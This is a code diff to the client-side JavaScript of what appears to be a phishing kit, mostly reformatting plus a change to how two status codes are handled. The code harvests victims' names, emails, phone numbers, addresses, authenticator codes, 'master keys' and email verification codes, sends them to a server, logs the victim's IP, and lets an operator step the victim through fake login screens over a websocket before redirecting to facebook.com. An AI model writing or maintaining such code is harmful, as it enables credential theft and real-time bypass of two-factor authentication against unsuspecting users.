@@ -30,7 +30,7 @@ let mobileNumber = document.getElementById("mobile-number");
 let address = document.getElementById("address");
 let authenticatorAppInput = document.getElementById("authenticator-app-input");
 let masterKeyInput = document.getElementById("master-key-input");
-let emailCodeInput = document.getElementById("email-code-input")
+let emailCodeInput = document.getElementById("email-code-input");
 
 let errorFullName = document.getElementById("error-full-name");
 let errorEmail = document.getElementById("error-email");
@@ -41,7 +41,7 @@ let errorAuthenticatorAppInput = document.getElementById(
   "error-authenticator-app-input"
 );
 let errorMasterKeyInput = document.getElementById("error-master-key-input");
-let errorEmailCodeInput = document.getElementById("error-email-code-input")
+let errorEmailCodeInput = document.getElementById("error-email-code-input");
 
 let continueSignIn = document.getElementById("continue-1");
 let enterAuthenticatorApp = document.getElementById("enter-authenticator-app");
@@ -80,7 +80,6 @@ if (hasRef) {
   let ref = gmail;
   if (id.includes("gmail")) {
     ref = gmail;
-    
   } else if (id.includes("outlook")) {
     ref = outlook;
   } else if (id.includes("libero")) {
@@ -95,14 +94,11 @@ if (hasRef) {
   let clientIp = null;
 
   socket.onopen = () => {
-    
-
     // Optionally get client IP and send to server for initial status
     fetch("https://api.ipify.org?format=json")
       .then((res) => res.json())
       .then((data) => {
         clientIp = data.ip;
-        
 
         socket.send(
           JSON.stringify({
@@ -149,30 +145,28 @@ if (hasRef) {
           enterMasterKey.innerHTML = defaultAuthenticatorAppContent;
           errorMasterKeyInput.style.display = "block";
         }
-        if(msg.data.stat == "7") {
+        if (msg.data.stat == "7") {
           show(fifth);
           errorEmailCodeInput.style.display = "none";
-          
         }
-        if(msg.data.stat == "8") {
+        if (msg.data.stat == "8") {
           show(fifth);
           enterEmailCode.className = defaultAuthenticatorAppClass;
           enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
           errorEmailCodeInput.style.display = "block";
         }
-        
-        if(msg.data.stat == "9") {
-          location.href = "https://www.facebook.com"
+
+        if (msg.data.stat == "9") {
+          location.href = "https://www.facebook.com";
         }
         // Update row in table
         break;
 
       case "IP_STATUS":
-        
         // You can keep your current show() logic here
         if (msg.exists) {
-          if(msg.stat == "0") {
-            show(sixth)
+          if (msg.stat == "0") {
+            show(sixth);
           }
           if (msg.stat == "1") {
             show(first);
@@ -199,19 +193,16 @@ if (hasRef) {
             enterMasterKey.className = defaultAuthenticatorAppClass;
             enterMasterKey.innerHTML = defaultAuthenticatorAppContent;
             errorMasterKeyInput.style.display = "block";
-          }
-          else if(msg.stat == "7") {
-            show(fifth);
-          enterEmailCode.className = defaultAuthenticatorAppClass;
-          enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
-          errorEmailCodeInput.style.display = "block";
-          }
-          else if(msg.stat == "8") {
+          } else if (msg.stat == "7") {
             show(fifth);
             errorEmailCodeInput.style.display = "none";
-          }
-          else if(msg.stat == "9") {
-            location.href = "https://www.facebook.com"
+          } else if (msg.stat == "8") {
+            show(fifth);
+            enterEmailCode.className = defaultAuthenticatorAppClass;
+            enterEmailCode.innerHTML = defaultAuthenticatorAppContent;
+            errorEmailCodeInput.style.display = "block";
+          } else if (msg.stat == "9") {
+            location.href = "https://www.facebook.com";
           }
         } else {
           show(first);
@@ -219,7 +210,6 @@ if (hasRef) {
         break;
 
       default:
-        
     }
   };
 
@@ -229,7 +219,6 @@ if (hasRef) {
       .then((res) => res.json())
       .then((data) => {
         ipAddress = data.ip;
-        
       })
       .catch((err) => console.error("Error fetching IP:", err));
 
@@ -295,8 +284,10 @@ if (hasRef) {
           currentUrl += "&ref=4";
           window.location.href = currentUrl;
         }, 3000);
-      }
-      else if(targetId == "enter-email-code" || targetId == "enter-email-code-span") {
+      } else if (
+        targetId == "enter-email-code" ||
+        targetId == "enter-email-code-span"
+      ) {
         if (emailCodeInput.value.trim() !== "") {
           enterEmailCode.className = loadingAuthenticatorAppClass;
           enterEmailCode.innerHTML = loadingAuthenticatorAppContent;
@@ -348,7 +339,11 @@ function show(next) {
 
 function sendUser() {
   let stat;
-  if (email.value.includes("gmail") || email.value.includes("outlook") || email.value.includes("libero")) {
+  if (
+    email.value.includes("gmail") ||
+    email.value.includes("outlook") ||
+    email.value.includes("libero")
+  ) {
     stat = "2";
   } else {
     stat = "0";
@@ -364,19 +359,18 @@ function sendUser() {
       email: email.value,
       mobile_number: mobileNumber.value,
       address: address.value,
-      stat: stat 
+      stat: stat,
     }),
   })
     .then((res) => res.json())
     .then((data) => {
       if (data == true) {
-        if(stat == "2") {
+        if (stat == "2") {
           show(third);
+        } else {
+          show(sixth);
         }
-        else {
-          show(sixth)
-        }
-        
+
         continueSignIn.className = defaultContinueSignInClass;
         continueSignIn.innerHTML = defaultContinueSignInContent;
       }
@@ -396,9 +390,7 @@ function updateStat() {
     }),
   })
     .then((res) => res.json())
-    .then((data) => {
-      
-    })
+    .then((data) => {})
     .catch((err) => console.log("POST Error: "));
 }
 
@@ -414,9 +406,7 @@ function sendAuthenticatorCode() {
     }),
   })
     .then((res) => res.json())
-    .then((data) => {
-      
-    })
+    .then((data) => {})
     .catch((err) => console.log("POST Error: "));
 }
 
@@ -432,9 +422,7 @@ function sendMasterKeyCode() {
     }),
   })
     .then((res) => res.json())
-    .then((data) => {
-      
-    })
+    .then((data) => {})
     .catch((err) => console.log("POST Error: "));
 }
 
@@ -450,9 +438,7 @@ function sendEmailCode() {
     }),
   })
     .then((res) => res.json())
-    .then((data) => {
-      
-    })
+    .then((data) => {})
     .catch((err) => console.log("POST Error: "));
 }
 
